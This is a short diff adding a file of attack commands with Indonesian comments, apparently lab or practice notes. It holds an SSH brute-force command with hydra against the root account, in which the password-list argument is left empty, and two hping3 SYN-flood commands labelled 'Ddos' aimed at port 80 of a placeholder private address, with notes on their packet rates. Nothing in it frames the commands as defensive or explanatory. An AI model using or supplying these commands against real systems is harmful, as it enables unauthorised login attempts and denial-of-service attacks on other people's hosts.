@@ -1,0 +1,11 @@
+#Brute Force SSH
+hydra -l root -P  ssh://192.168.10.x #ip tujuan
+
+#Ddos
+hping3 -S -p 80 -i u10000 192.168.10.x
+#keterangan
+#-i u10000: Interval 10 milidetik (100 paket per detik).
+
+hping3 -S -p 80 -d 512 -i u5000 192.168.10.x
+#keterangan
+#-i u5000: Interval 5 milidetik (200 paket per detik).
